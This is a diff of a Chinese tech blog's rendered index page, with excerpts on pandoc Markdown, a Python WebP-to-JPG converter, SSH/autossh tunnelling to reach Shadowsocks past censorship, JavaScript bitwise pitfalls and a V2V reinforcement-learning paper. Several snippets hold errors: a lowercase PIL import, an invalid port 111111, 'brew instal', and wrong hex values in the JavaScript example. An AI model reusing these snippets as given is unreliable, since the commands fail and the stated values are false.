@@ -565,7 +565,7 @@
 
       
         
-          之前为了公式渲染问题，我将Hexo的渲染引擎切换到了pandoc。不过pandoc除了带来公式渲染功能之外，还为markdown语法提供了扩展。这篇文章旨在梳理pandoc提供的各种新增markdown功能。pandoc提供的完整文档位于[这里](https://pandoc.org/MANUAL.html#pandocs-markdown#pandocs-markdown)
+          <p>之前为了公式渲染问题，我将Hexo的渲染引擎切换到了pandoc。不过pandoc除了带来公式渲染功能之外，还为markdown语法提供了扩展。这篇文章旨在梳理pandoc提供的各种新增markdown功能。pandoc提供的完整文档位于<a href="https://pandoc.org/MANUAL.html#pandocs-markdown#pandocs-markdown" target="_blank" rel="noopener">这里</a></p>
           <!--noindex-->
           
             <div class="post-button text-center">
@@ -758,25 +758,17 @@
       
         
           
-            
-转换需要使用`Pillow`这个库：
-
-<!--￼0-->
-
-代码如下：
-
-<!--￼1-->
-
-> 以上代码参考了文章：[Image Conversion (JPG ⇄ PNG/JPG ⇄ WEBP) with Python](https://medium.com/@ajeetham/image-type-conversion-jpg-png-jpg-webp-png-webp-with-python-7d5df09394c9)
-
-下面这个代码提供了更加完整的功能，包括支持输入图片的url以完成自动下载和格式转换：
-
-<!--￼2-->
-
-将文件保存为`webp2jpg`并将其路径加入`PATH`环境变量，那么就可以以如下方式使用这个脚本:
-
-<!--￼3-->
-
+            <p>转换需要使用<code>Pillow</code>这个库：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">pip install Pillow</span><br></pre></td></tr></table></figure>
+<p>代码如下：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> image</span><br><span class="line">im = Image.open(input_image).convert(<span class="string">"RGB"</span>)</span><br><span class="line">im.save(<span class="string">"test.jpg"</span>, <span class="string">"jpeg"</span>)</span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>以上代码参考了文章：<a href="https://medium.com/@ajeetham/image-type-conversion-jpg-png-jpg-webp-png-webp-with-python-7d5df09394c9" target="_blank" rel="noopener">Image Conversion (JPG ⇄ PNG/JPG ⇄ WEBP) with Python</a></p>
+</blockquote>
+<p>下面这个代码提供了更加完整的功能，包括支持输入图片的url以完成自动下载和格式转换：</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="keyword">import</span> argparse</span><br><span class="line"><span class="keyword">import</span> urllib.request</span><br><span class="line"><span class="keyword">from</span> PIL <span class="keyword">import</span> Image</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">download_image</span><span class="params">(url)</span>:</span></span><br><span class="line">    path, _ = urllib.request.urlretrieve(url)</span><br><span class="line">    print(path)</span><br><span class="line">    <span class="keyword">return</span> path</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    parser = argparse.ArgumentParser()</span><br><span class="line">    parser.add_argument(<span class="string">'input_file'</span>, help=<span class="string">"输入文件"</span>)</span><br><span class="line">    parser.add_argument(<span class="string">'output_file'</span>, help=<span class="string">"输出文件"</span>, nargs=<span class="string">"?"</span>)</span><br><span class="line">    opt = parser.parse_args()</span><br><span class="line">    input_file = opt.input_file</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> input_file.startswith(<span class="string">"http"</span>):</span><br><span class="line">        <span class="keyword">if</span> opt.output_file <span class="keyword">is</span> <span class="keyword">None</span>:</span><br><span class="line">            print(<span class="string">"输入是URL时必须制定输出文件"</span>)</span><br><span class="line">        input_file = download_image(input_file)</span><br><span class="line">    <span class="keyword">elif</span> <span class="keyword">not</span> input_file.endswith(<span class="string">".webp"</span>):</span><br><span class="line">        print(<span class="string">"输入文件不是webp格式的"</span>)</span><br><span class="line">        exit()</span><br><span class="line">    filename = <span class="string">"."</span>.join(input_file.split(<span class="string">"."</span>)[<span class="number">0</span>:<span class="number">-1</span>])</span><br><span class="line">    output_file = opt.output_file <span class="keyword">or</span> (<span class="string">"%s.jpg"</span> % filename)</span><br><span class="line">    im = Image.open(input_file).convert(<span class="string">"RGB"</span>)</span><br><span class="line">    im.save(output_file,  <span class="string">"jpeg"</span>)</span><br><span class="line">    urllib.request.urlcleanup()</span><br></pre></td></tr></table></figure>
+<p>将文件保存为<code>webp2jpg</code>并将其路径加入<code>PATH</code>环境变量，那么就可以以如下方式使用这个脚本:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">webp2jpg input.webp output.jpg</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> 下面这个命令的输出文件是input.jpg</span></span><br><span class="line">webp2jpg input.webp</span><br><span class="line"></span><br><span class="line">webp2jpg http://host.com/file.webp local_save.jpg</span><br></pre></td></tr></table></figure>
 
           
         
@@ -962,81 +954,47 @@
       
         
           
-            
-现在GFW不断加高，翻墙的服务搞不好什么时候就挂了，之前我在文章里介绍过比较稳定的方法是使用一台能够从ipv4到ipv6的跳板机。但跳板机挂了就糟糕了。这篇文章就是我昨天遇到这个问题时弄的一个临时性办法，可以在Shadowsocks流量被拦截，跳板机挂掉的情况下，使用SSH隧道连接翻墙服务器以使用Shadowsocks的服务。
-
-最近因为新冠肺炎疫情的关系，GFW对于翻墙流量的审查更加严格了，基于Ipv4的直连方式访问Shadowsocks基本不可能了。但是GFW的拦截基本针对流量特征的，有些服务器的IP实际上并未处于黑名单中。因此我们使用别的方式还是能够连接到翻墙服务器的。例如SSH访问服务器就能成功。这时我们可以使用SSH开通一个从我们本地电脑的localhost到翻墙服务器的localhost的隧道，将我们本地的地址的端口映射到翻墙服务器的本地地址端口。这样我们通过本地地址端口访问远端的Shadowsocks的服务时，我们的客户端和服务器的通信流量就不再是Shadowsocks流量，而是SSH特征的流量，这样通信就可以绕过GFW的检查了。
-
-## ssh隧道
-
-完整的SSH隧道的教程网络上能搜到很多，比如[这篇](https://www.ssh.com/ssh/tunneling/example)。我们只需要使用Local Forwarding模式。这个模式下，客户端的本地端口被映射到服务端的端口。命令的基本形式如下：
-
-<!--￼0-->
-
-如果我们的翻墙服务器的地址是`jump.server.com`，用户名是`ss`，Shadowsocks服务的端口是`11111`则使用下面的命令：
-
-<!--￼1-->
-
-我们就可以将我们本地的`8000`端口映射到Shadowsocks的服务端口上。在Shadowsocks设置中，原本的设置只需要将地址修改为localhost，端口修改8000，就可以访问远端的Shadowsocks服务了。
-
-不过上面的命令会打开一个SSH会话，如果我们退出这个会话，会导致隧道中断。因此我们改进命令为
-
-<!--￼2-->
-
-这个命令会在打开SSH隧道，将ssh进程转到后台运行。
-
-## autossh
-
-不过ssh命令本身可能不太稳定，连接中断后ssh会退出。为了提升稳定性，我们需要能够监管ssh进程并在断线时自动重启ssh服务。`autossh`就是这样一款工具。目前`autossh`可以在Linux和macOS上运行，适用于Windows的工具我还没来得及找到。以macOS为例，可以使用Homebrew安装:
-
-<!--￼3-->
-
-其使用方式非常简单，命令形式是
-
-<!--￼4-->
-
-其中`-V`是查看版本，不用管。`-M`是指定检测端口，实际上就是用来检测连接是否可用的。只是使用你不需要了解太多，随意指定一个本地高位端口（地位端口容易被占用）即可，例如20000（关于`-M`的地址参加[这个链接](http://www.debianadmin.com/autossh-automatically-restart-ssh-sessions-and-tunnels.html)）。`-f`会让程序在后台运行。而后跟上ssh的选项即可。注意因为autossh会管理ssh进程，我们不需要在后面在引入`-f`来告诉ssh进入后台运行。那么
-
-<!--￼5-->
-
-这个命令用`autossh`改写为
-
-<!--￼6-->
-
-即可。
-
-## Windows的支持
-
-Windows上用的比较多的SSH客户端是PuTTY，不过PuTTY不能很好地满足ssh隧道的需求。这里我推荐的是[Bitvise](https://www.bitvise.com/ssh-client-download)这个软件（点击链接可以前往下载页面）。这里给出Bitvise的配置方法。
-
-首先下载Bitvise软件并完成安装。安装完成后打开，在Login界面，输入服务器的信息，包括Host，Port，以及用户名。这里Initial Method指的是认证手段，图中选择的是密码，通过下拉框也可以选择公钥验证或其他验证方法。
-
-![](https://imgs.codewoody.com/uploads/big/9481da177c540367f38733d6c371d2a6.PNG)
-
-接下来前往Options页面，确保"Automatically reconnect if successful connection breaks"。这个功能比较关键，可以确保ssh连接中断时程序能够自动重新建立连接。另外要注意右侧的选项。由于我们只希望建立操作，而不需要登录到服务器进行其他操作，所以我们可以去掉Open Terminal和Open SFTP的选项。
-
-![](https://imgs.codewoody.com/uploads/big/a67c5007eed2f8229369e8450ab3b148.PNG)
-
-最后前往C2S界面配置端口映射以建立SSH隧道：
-
-![](https://imgs.codewoody.com/uploads/big/cb3448748978270c4dcc48ca48694f68.PNG)
-
-需要解释的是：
-
-- Listen Interface 表示本地监听的接口。如果只是作为ssh客户端的电脑使用，那么填写localhost即可。如果希望把隧道同局域网内的其他设备共享，可以填写局域网地址或者0.0.0.0。
-- List. Port 为本地监听监听端口
-- Destination Host 这个概念要非常注意。很多新手可能会填写服务器的地址，如其公网IP。其实这是对SSH隧道缺乏了解导致的。这里的目的地址，是从服务器的视角来看的，我们要连接的是服务器本地的端口，所以这里填写localhost。
-- Dest. Port 为服务器端shadowsocks服务的端口
-
-上面的配置完成以后点击Log in即可建立连接。注意右上角有一个"Closing and minimization"的按钮，点开这个按钮可以选择点击右上角关闭按钮之后的程序行为，我们可以选择的"Hide to notification area if connected, exit otherwise"，这样可以关闭窗口同时保证程序继续在后台运行。
-
-## 稳定性讨论
-
-用SSH隧道来实现翻墙，连接本身就是不太稳定的，在[这个链接](https://unix.stackexchange.com/questions/275681/ssh-connection-through-ssh-tunnel-keeps-closing)，答主提到使用`-M`选项来让autossh负责检查连接的可用性会比较不可靠，推荐使用ssh自己来负责监控连接。具体方式是设置`-M 0`，同时为ssh传递`-o "ServerAliveInterval 30" -o "TCPKeepAlive yes"`参数。完整的命令为
-
-<!--￼7-->
-
-当`-M 0`时，autossh只会在ssh进程退出时重启进程，而不会检测联机本身的是否可用。关于`ServerAliveInterval`作用的细节，参见[这篇文章](http://einverne.github.io/post/2017/05/ssh-keep-alive.html)。
+            <p>现在GFW不断加高，翻墙的服务搞不好什么时候就挂了，之前我在文章里介绍过比较稳定的方法是使用一台能够从ipv4到ipv6的跳板机。但跳板机挂了就糟糕了。这篇文章就是我昨天遇到这个问题时弄的一个临时性办法，可以在Shadowsocks流量被拦截，跳板机挂掉的情况下，使用SSH隧道连接翻墙服务器以使用Shadowsocks的服务。</p>
+<p>最近因为新冠肺炎疫情的关系，GFW对于翻墙流量的审查更加严格了，基于Ipv4的直连方式访问Shadowsocks基本不可能了。但是GFW的拦截基本针对流量特征的，有些服务器的IP实际上并未处于黑名单中。因此我们使用别的方式还是能够连接到翻墙服务器的。例如SSH访问服务器就能成功。这时我们可以使用SSH开通一个从我们本地电脑的localhost到翻墙服务器的localhost的隧道，将我们本地的地址的端口映射到翻墙服务器的本地地址端口。这样我们通过本地地址端口访问远端的Shadowsocks的服务时，我们的客户端和服务器的通信流量就不再是Shadowsocks流量，而是SSH特征的流量，这样通信就可以绕过GFW的检查了。</p>
+<h1 data-number="1" id="ssh隧道"><span class="header-section-number">1</span> ssh隧道</h1>
+<p>完整的SSH隧道的教程网络上能搜到很多，比如<a href="https://www.ssh.com/ssh/tunneling/example" target="_blank" rel="noopener">这篇</a>。我们只需要使用Local Forwarding模式。这个模式下，客户端的本地端口被映射到服务端的端口。命令的基本形式如下：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L local_addr:local_port:remote_addr:remote_port username@jump-server-addr</span><br></pre></td></tr></table></figure>
+<p>如果我们的翻墙服务器的地址是<code>jump.server.com</code>，用户名是<code>ss</code>，Shadowsocks服务的端口是<code>11111</code>则使用下面的命令：</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -L 8000:localhost:111111 ss@jump.server.com</span><br></pre></td></tr></table></figure>
+<p>我们就可以将我们本地的<code>8000</code>端口映射到Shadowsocks的服务端口上。在Shadowsocks设置中，原本的设置只需要将地址修改为localhost，端口修改8000，就可以访问远端的Shadowsocks服务了。</p>
+<p>不过上面的命令会打开一个SSH会话，如果我们退出这个会话，会导致隧道中断。因此我们改进命令为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -L 8000:localhost:111111 ss@jump.server.com</span><br></pre></td></tr></table></figure>
+<p>这个命令会在打开SSH隧道，将ssh进程转到后台运行。</p>
+<h1 data-number="2" id="autossh"><span class="header-section-number">2</span> autossh</h1>
+<p>不过ssh命令本身可能不太稳定，连接中断后ssh会退出。为了提升稳定性，我们需要能够监管ssh进程并在断线时自动重启ssh服务。<code>autossh</code>就是这样一款工具。目前<code>autossh</code>可以在Linux和macOS上运行，适用于Windows的工具我还没来得及找到。以macOS为例，可以使用Homebrew安装:</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">brew instal autossh</span><br></pre></td></tr></table></figure>
+<p>其使用方式非常简单，命令形式是</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autossh [-V] [-M monitor_port[:echo_port]] [-f] [SSH_OPTIONS]</span><br></pre></td></tr></table></figure>
+<p>其中<code>-V</code>是查看版本，不用管。<code>-M</code>是指定检测端口，实际上就是用来检测连接是否可用的。只是使用你不需要了解太多，随意指定一个本地高位端口（地位端口容易被占用）即可，例如20000（关于<code>-M</code>的地址参加<a href="http://www.debianadmin.com/autossh-automatically-restart-ssh-sessions-and-tunnels.html" target="_blank" rel="noopener">这个链接</a>）。<code>-f</code>会让程序在后台运行。而后跟上ssh的选项即可。注意因为autossh会管理ssh进程，我们不需要在后面在引入<code>-f</code>来告诉ssh进入后台运行。那么</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh -N -f -L 8000:localhost:111111 ss@jump.server.com</span><br></pre></td></tr></table></figure>
+<p>这个命令用<code>autossh</code>改写为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autossh -M 20000 -f -N -f -L 8000:localhost:111111 ss@jump.server.com</span><br></pre></td></tr></table></figure>
+<p>即可。</p>
+<h1 data-number="3" id="windows的支持"><span class="header-section-number">3</span> Windows的支持</h1>
+<p>Windows上用的比较多的SSH客户端是PuTTY，不过PuTTY不能很好地满足ssh隧道的需求。这里我推荐的是<a href="https://www.bitvise.com/ssh-client-download" target="_blank" rel="noopener">Bitvise</a>这个软件（点击链接可以前往下载页面）。这里给出Bitvise的配置方法。</p>
+<p>首先下载Bitvise软件并完成安装。安装完成后打开，在Login界面，输入服务器的信息，包括Host，Port，以及用户名。这里Initial Method指的是认证手段，图中选择的是密码，通过下拉框也可以选择公钥验证或其他验证方法。</p>
+<p><img src="https://imgs.codewoody.com/uploads/big/9481da177c540367f38733d6c371d2a6.PNG"></p>
+<p>接下来前往Options页面，确保"Automatically reconnect if successful connection breaks"。这个功能比较关键，可以确保ssh连接中断时程序能够自动重新建立连接。另外要注意右侧的选项。由于我们只希望建立操作，而不需要登录到服务器进行其他操作，所以我们可以去掉Open Terminal和Open SFTP的选项。</p>
+<p><img src="https://imgs.codewoody.com/uploads/big/a67c5007eed2f8229369e8450ab3b148.PNG"></p>
+<p>最后前往C2S界面配置端口映射以建立SSH隧道：</p>
+<p><img src="https://imgs.codewoody.com/uploads/big/cb3448748978270c4dcc48ca48694f68.PNG"></p>
+<p>需要解释的是：</p>
+<ul>
+<li>Listen Interface 表示本地监听的接口。如果只是作为ssh客户端的电脑使用，那么填写localhost即可。如果希望把隧道同局域网内的其他设备共享，可以填写局域网地址或者0.0.0.0。</li>
+<li>List. Port 为本地监听监听端口</li>
+<li>Destination Host 这个概念要非常注意。很多新手可能会填写服务器的地址，如其公网IP。其实这是对SSH隧道缺乏了解导致的。这里的目的地址，是从服务器的视角来看的，我们要连接的是服务器本地的端口，所以这里填写localhost。</li>
+<li>Dest. Port 为服务器端shadowsocks服务的端口</li>
+</ul>
+<p>上面的配置完成以后点击Log in即可建立连接。注意右上角有一个"Closing and minimization"的按钮，点开这个按钮可以选择点击右上角关闭按钮之后的程序行为，我们可以选择的"Hide to notification area if connected, exit otherwise"，这样可以关闭窗口同时保证程序继续在后台运行。</p>
+<h1 data-number="4" id="稳定性讨论"><span class="header-section-number">4</span> 稳定性讨论</h1>
+<p>用SSH隧道来实现翻墙，连接本身就是不太稳定的，在<a href="https://unix.stackexchange.com/questions/275681/ssh-connection-through-ssh-tunnel-keeps-closing" target="_blank" rel="noopener">这个链接</a>，答主提到使用<code>-M</code>选项来让autossh负责检查连接的可用性会比较不可靠，推荐使用ssh自己来负责监控连接。具体方式是设置<code>-M 0</code>，同时为ssh传递<code>-o "ServerAliveInterval 30" -o "TCPKeepAlive yes"</code>参数。完整的命令为</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">autossh -M 0 -f -N -f -L 8000:localhost:111111 ss@jump.server.com -o "ServerAliveInterval 30" -o "TCPKeepAlive yes"</span><br></pre></td></tr></table></figure>
+<p>当<code>-M 0</code>时，autossh只会在ssh进程退出时重启进程，而不会检测联机本身的是否可用。关于<code>ServerAliveInterval</code>作用的细节，参见<a href="http://einverne.github.io/post/2017/05/ssh-keep-alive.html" target="_blank" rel="noopener">这篇文章</a>。</p>
 
           
         
@@ -1221,9 +1179,8 @@ Windows上用的比较多的SSH客户端是PuTTY，不过PuTTY不能很好地满
 
       
         
-          原文地址是: [Training a Convolutional Neural Network from scratch](https://towardsdatascience.com/training-a-convolutional-neural-network-from-scratch-2235c2a25754)。原文的撰写时间是2019年6月7日。
-
-在这篇文章中，我们将会深入了解卷积神经网络(Convolutional Neural Networks, CNN)，重点是如何训练一个卷积神经网络。这篇文章会教你如何推导梯度，实现backprop过程（只使用numpy），并最终建立起一个完整的训练的工作流。这里我们架设你对于什么是卷积神经网络有一个基础的了解。如果你还缺乏最基本的知识，可以阅读原文作者的[文章](https://victorzhou.com/blog/intro-to-cnns-part-1/)。同时文章中部分地方还假定你对于多元微积分有一定的了解<span class="foot-note-span">【基本上你好好上过大学的高等数学应该就能理解】</span>。
+          <p>原文地址是: <a href="https://towardsdatascience.com/training-a-convolutional-neural-network-from-scratch-2235c2a25754" target="_blank" rel="noopener">Training a Convolutional Neural Network from scratch</a>。原文的撰写时间是2019年6月7日。</p>
+<p>在这篇文章中，我们将会深入了解卷积神经网络(Convolutional Neural Networks, CNN)，重点是如何训练一个卷积神经网络。这篇文章会教你如何推导梯度，实现backprop过程（只使用numpy），并最终建立起一个完整的训练的工作流。这里我们架设你对于什么是卷积神经网络有一个基础的了解。如果你还缺乏最基本的知识，可以阅读原文作者的<a href="https://victorzhou.com/blog/intro-to-cnns-part-1/" target="_blank" rel="noopener">文章</a>。同时文章中部分地方还假定你对于多元微积分有一定的了解<span class="foot-note-span">【基本上你好好上过大学的高等数学应该就能理解】</span>。</p>
           <!--noindex-->
           
             <div class="post-button text-center">
@@ -1416,26 +1373,18 @@ Windows上用的比较多的SSH客户端是PuTTY，不过PuTTY不能很好地满
       
         
           
-            
-这两天在写 Electron 的时候发现了一个很诡异的错误。程序前两天测试的时候没有问题，今天突然不行了。检查代码发现错误原因是这样的：
-
-<!--￼0-->
-
-其中`buf`是一个`Buffer`对象，`now`是一个时间戳，为一个较大的整数。这行代码的目的是将时间戳的低 32 位写入 `buf`。不过，当`now`的第三十二位(自低向高)为 1 时，`now & 0xffffffff`出来的会是负数，这样在`writeUint32BE`的检查中就会报错，因为这个函数不允许写入负数。
-
-`now`的位数显然超过了 32 比特，如果在一些类型比较强的语言里面，应该会被视为一个64位整数。那么做位运算之后应该还是一个64位整数。上面这个错误说明在Js中，一个64位整型的数字在位运算之后得到的却是一个32位有符号数。是否是`0xffffffff`限制了输出的位数呢？
-
-<!--￼1-->
-
-> 0xffffffff 当做32位有符号数就是-1
-
-可见我们用64位的mask去做位运算得到的还是32位有符号数。
-
-这种乱象的根本原因是，js实际上是使用 [IEEE-754 浮点数](https://en.wikipedia.org/wiki/IEEE_754)来表示所有的数字的，包括整型也是用浮点数来表示的。另外，在js中，位运算的输出总是被当做有符号32位数字[source](https://stackoverflow.com/questions/15517646/how-are-32-bit-javascript-numbers-resulting-from-a-bit-wise-operation-converted)。为了摒除这两个因素的影响，我们就无法用位运算来提取低32位的内容，而应该转而使用取余运算：
-
-<!--￼2-->
-
-其中`4294967296 = 0x1000000000`, `4294967295=0xffffffff`。
+            <p>这两天在写 Electron 的时候发现了一个很诡异的错误。程序前两天测试的时候没有问题，今天突然不行了。检查代码发现错误原因是这样的：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">buf.writeUint32BE(now &amp; <span class="number">0xffffffff</span>, idx)</span><br></pre></td></tr></table></figure>
+<p>其中<code>buf</code>是一个<code>Buffer</code>对象，<code>now</code>是一个时间戳，为一个较大的整数。这行代码的目的是将时间戳的低 32 位写入 <code>buf</code>。不过，当<code>now</code>的第三十二位(自低向高)为 1 时，<code>now &amp; 0xffffffff</code>出来的会是负数，这样在<code>writeUint32BE</code>的检查中就会报错，因为这个函数不允许写入负数。</p>
+<p><code>now</code>的位数显然超过了 32 比特，如果在一些类型比较强的语言里面，应该会被视为一个64位整数。那么做位运算之后应该还是一个64位整数。上面这个错误说明在Js中，一个64位整型的数字在位运算之后得到的却是一个32位有符号数。是否是<code>0xffffffff</code>限制了输出的位数呢？</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&gt; a = <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">68719476735</span></span><br><span class="line">&gt; a &amp; <span class="number">0x00000000ffffffff</span></span><br><span class="line"><span class="number">-1</span></span><br></pre></td></tr></table></figure>
+<blockquote>
+<p>0xffffffff 当做32位有符号数就是-1</p>
+</blockquote>
+<p>可见我们用64位的mask去做位运算得到的还是32位有符号数。</p>
+<p>这种乱象的根本原因是，js实际上是使用 <a href="https://en.wikipedia.org/wiki/IEEE_754" target="_blank" rel="noopener">IEEE-754 浮点数</a>来表示所有的数字的，包括整型也是用浮点数来表示的。另外，在js中，位运算的输出总是被当做有符号32位数字<a href="https://stackoverflow.com/questions/15517646/how-are-32-bit-javascript-numbers-resulting-from-a-bit-wise-operation-converted" target="_blank" rel="noopener">source</a>。为了摒除这两个因素的影响，我们就无法用位运算来提取低32位的内容，而应该转而使用取余运算：</p>
+<figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&gt; &gt; a = <span class="number">0xffffffff</span></span><br><span class="line"><span class="number">68719476735</span></span><br><span class="line">&gt; mask = <span class="built_in">Math</span>.pow(<span class="number">2</span>, <span class="number">32</span>)</span><br><span class="line"><span class="number">4294967296</span></span><br><span class="line">&gt; lower_32_bits = a % mask</span><br><span class="line"><span class="number">4294967295</span></span><br></pre></td></tr></table></figure>
+<p>其中<code>4294967296 = 0x1000000000</code>, <code>4294967295=0xffffffff</code>。</p>
 
           
         
@@ -1621,188 +1570,123 @@ Windows上用的比较多的SSH客户端是PuTTY，不过PuTTY不能很好地满
       
         
           
-            
-## 概述
-
-本次要读的论文是[Deep Reinforcement Learning Based Resource Allocation for V2V Communications](https://ieeexplore.ieee.org/document/8633948)，是 TVT 上的Popular Articles 中的第一篇。主要讲的内容是用增强学习（或者叫强化学习）来做 V2V 通信的资源分配。目前使用强化学习来做**分布式**的资源分配方案是一种比较流行的做法。使用强化学习做资源分配不要求决策者掌握全局信息。
-
-对于任何一个「资源分配」机制来说，首先要明确定义待分配的资源是何种形式，以及执行分配的主体为何。在文章的 Abstract 中提到，分配的资源是：
-
-> <i>An autonomous "agent", a V2V link or a vehicle, make its decisions to find the optimal sub-band and power-level for transmission without requiring or having to wait for global information. ... . each agent can effectively learn to satisfy the stringent latency constraints on V2V links while minimizing the interference to vehicle-to-infrastructure communications.</i>
-
-从上面的论述我们可以总结如下的信息：
-
-1. 执行资源分配的主体是一条通信链路或者一个通信节点
-2. 待分配的资源的形式是Sub-band（可以理解为可用信道）和发射功率。发射功率直接与通信范围相关。调节通信范围是进行空分复用的一种方式
-3. 资源分配的目标是满足延时要求，以及最小化 V2I 通信需求
-4. 这里车间通信使用的是 5G D2D
-
-## 研究背景
-
-传统的资源分配方式一般是中心式的。这种分配方式要求从每个节点收集局部网络信息（链路状态和干扰信息）。在调度中心，资源分配问题被建模为一个优化问题，限制条件为V2V通信的QoS要求。不过这种优化问题一般是 NP 难问题。这种问题一般会用一些启发式算法来求局部最优解或者次优解。这类方法的首要问题是信息收集汇总的过程开销太大了，且随着网络规模的扩大会显著地增长。故这篇文章寻求使用分布式的分配方案。
-
-现存的一些分布式的资源分配方式的问题是他们考虑的一般是单播通信(Unicast)，而非广播过程。广播通信模式中的广播风暴也是资源分配机制需要考虑的问题。传统的方法一般用随机转发或者是基于拓扑信息管理转发的方法来解决这个问题。
-
-上面讨论的是中心时和分布式的资源分配方式存在的问题。下面讨论的是更加细节的问题。
-
-在现有的研究中，V2V链路的QoS值包含了SINR这一个指标，延时限制这个指标不太好建模进入优化问题，因此没有被充分考虑。
-
-为了解决上述这些问题，作者提出使用深度增强学习来解决单播和广播通信中的资源分配问题。作者主要用深度增强学习来研究从本地观测量，如CSI（信道状态信息），干扰水平等，和资源分配和调度方案之间的映射关系。在单播通信中，每个V2V链路被视为一个agent(代理)，频谱和传输功率为待控制的量。在广播通信中，每个节点被视为一个agent，待控制量为频谱和消息(messages)。Observation, action还有reward function都根据单播和广播做了单独的设计。
-
-## 系统模型(Unicast)
-
-![](https://imgs.codewoody.com/uploads/big/e98332816ed0c02b3cd7e6e8185d676a.png)
-
-如上图所示，车联网中包含 $M$ 个基站用户(CUEs)，标记为$\mathcal{M} = \{1, 2, \dots, M\}$以$K$对V2V用户(VUEs)，记为$\mathcal{K} = \{1, 2, \dots, K\}$，CUEs需要V2I链路来支撑和基站(BS)的通信，而VUEs需要V2V连接来共享交通安全管理相关的信息。为了改善频谱利用效率，我们假设为V2I上行链路正交分配的频谱是和V2V链路共享的，这是因为在基站处的干扰情况要更加可控一些，而且上行链路的负载要低很多。
-
-第$m^{th}$个CUE的SINR为
-
-$$
+            <h1 data-number="1" id="概述"><span class="header-section-number">1</span> 概述</h1>
+<p>本次要读的论文是<a href="https://ieeexplore.ieee.org/document/8633948" target="_blank" rel="noopener">Deep Reinforcement Learning Based Resource Allocation for V2V Communications</a>，是 TVT 上的Popular Articles 中的第一篇。主要讲的内容是用增强学习（或者叫强化学习）来做 V2V 通信的资源分配。目前使用强化学习来做<strong>分布式</strong>的资源分配方案是一种比较流行的做法。使用强化学习做资源分配不要求决策者掌握全局信息。</p>
+<p>对于任何一个「资源分配」机制来说，首先要明确定义待分配的资源是何种形式，以及执行分配的主体为何。在文章的 Abstract 中提到，分配的资源是：</p>
+<blockquote>
+<p><i>An autonomous "agent", a V2V link or a vehicle, make its decisions to find the optimal sub-band and power-level for transmission without requiring or having to wait for global information. ... . each agent can effectively learn to satisfy the stringent latency constraints on V2V links while minimizing the interference to vehicle-to-infrastructure communications.</i></p>
+</blockquote>
+<p>从上面的论述我们可以总结如下的信息：</p>
+<ol type="1">
+<li>执行资源分配的主体是一条通信链路或者一个通信节点</li>
+<li>待分配的资源的形式是Sub-band（可以理解为可用信道）和发射功率。发射功率直接与通信范围相关。调节通信范围是进行空分复用的一种方式</li>
+<li>资源分配的目标是满足延时要求，以及最小化 V2I 通信需求</li>
+<li>这里车间通信使用的是 5G D2D</li>
+</ol>
+<h1 data-number="2" id="研究背景"><span class="header-section-number">2</span> 研究背景</h1>
+<p>传统的资源分配方式一般是中心式的。这种分配方式要求从每个节点收集局部网络信息（链路状态和干扰信息）。在调度中心，资源分配问题被建模为一个优化问题，限制条件为V2V通信的QoS要求。不过这种优化问题一般是 NP 难问题。这种问题一般会用一些启发式算法来求局部最优解或者次优解。这类方法的首要问题是信息收集汇总的过程开销太大了，且随着网络规模的扩大会显著地增长。故这篇文章寻求使用分布式的分配方案。</p>
